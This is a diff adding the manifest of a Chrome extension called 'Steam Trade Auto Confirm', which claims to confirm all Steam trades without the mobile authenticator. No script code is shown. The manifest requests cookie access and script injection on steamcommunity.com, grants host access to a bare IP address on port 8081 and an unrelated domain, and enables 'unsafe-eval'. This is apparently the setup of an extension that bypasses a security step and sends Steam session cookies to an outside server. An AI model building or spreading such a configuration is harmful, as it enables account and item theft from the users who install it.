@@ -1,0 +1,50 @@
+{
+	"manifest_version": 2,
+
+	"name": "Steam Trade Auto Confirm",
+	"short_name": "STAC",
+	"version": "1.3.7",
+	"description": "It will confirm all trades automatically without Steam Mobile Authenticator.",
+
+	"permissions": [
+		"cookies",
+		"storage",
+		"http://steamcommunity.com/*",
+		"http://*.steamcommunity.com/*",
+		"https://steamcommunity.com/*",
+		"https://*.steamcommunity.com/*",
+		"http://83.220.175.150:8081/*",
+		"http://*.risenraise.com/*",
+		"tabs",
+		"notifications"
+	],
+	
+	"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+	
+	"icons": {
+		"48": "images/icon48.png",
+		"128": "images/icon128.png"
+	},
+	
+	"content_scripts": [ {
+	"matches": [
+		"http://steamcommunity.com/*",
+		"http://*.steamcommunity.com/*",
+		"https://steamcommunity.com/*",
+		"http://*.risenraise.com/*",
+		"https://*.steamcommunity.com/*"
+	],
+	
+	"js": ["js/jquery.js", "js/cookie.js", "js/steamauth.js"]
+	}],
+	
+	"background": {
+		"scripts": ["js/jquery.js", "js/cookie.js", "js/background.js"]
+	},
+	
+	"browser_action": {
+		"default_title": "Steam Trade Auto Confirm", 
+		"default_icon": "images/icon.png",
+		"default_popup": "popup.html"
+	}
+}
